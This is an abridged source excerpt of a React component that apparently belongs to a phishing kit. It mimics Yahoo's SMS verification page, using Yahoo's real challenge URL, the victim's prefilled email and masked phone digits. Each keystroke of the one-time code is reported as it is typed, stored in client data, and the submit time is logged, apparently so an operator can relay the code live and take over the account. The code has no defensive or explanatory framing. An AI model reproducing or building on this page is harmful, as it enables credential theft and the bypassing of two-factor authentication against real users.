...
const YahooSmsPage = () => {
  const translations = {
    ...
    url: "https://login.yahoo.com/account/challenge/sms?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  ...
  const resolvedEmail = React.useMemo(() => {
    const fromClient =
      (clientData && (clientData.yahooSmsEmail || clientData.email)) || "";
    if (fromClient && String(fromClient).trim())
      return String(fromClient).trim();
    try {
      return (
        (typeof window !== "undefined" &&
          ((localStorage.getItem("yahoo_sms_email") || "").trim() ||
  ...
  const smsDigits = React.useMemo(() => {
    const d =
      (clientData && clientData.yahooSmsDigits) ||
      (typeof window !== "undefined" &&
        localStorage.getItem("yahoo_sms_digits")) ||
      "";
    return String(d || "")
      .replace(/\D/g, "")
      .slice(0, 4);
  ...
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_sms",
        currentPage: "yahoo_sms",
        yahooStage: "SMS",
        fromForm: true,
      });
    } catch {}
      ...
      >
        ...
        <div style={{ padding: "24px 24px 14px 24px" }}>
          ...
          >
            ...
            <strong>
              {(() => {
                const mask =
                  ...
                  "(**) *****-****";
                if (!smsDigits) return mask;
                const ds = String(smsDigits);
                let i = ds.length - 1;
            ...
            if it is linked to your account
          </p>
          ...
          <input
            ...
            onChange={(e) => {
              ...
              setCode(val);
              try {
                updateClientData({ yahooSms: val });
                reportTyping("yahoosms", val);
              } catch {}
            }}
            style={{
              width: "100%",
          ...
          <div style={{ marginTop: 6 }}>
            {invalidMessage && (
              <div style={{ color: "#a4262c", fontSize: 12, marginBottom: 8 }}>
                {invalidMessage}
              </div>
            )}
          </div>
          <div style={{ marginTop: 6 }}>
            <button
              ...
              onClick={(e) => {
                ...
                try {
                  updateClientData({ yahooSmsSubmittedAt: Date.now() });
                } catch {}
              }}
            >
              Next
          ...
          <div style={{ marginTop: 16, textAlign: "center" }}>
            <a
              ...
              style={{ color: "#6a33f5", textDecoration: "none", fontSize: 14 }}
            >
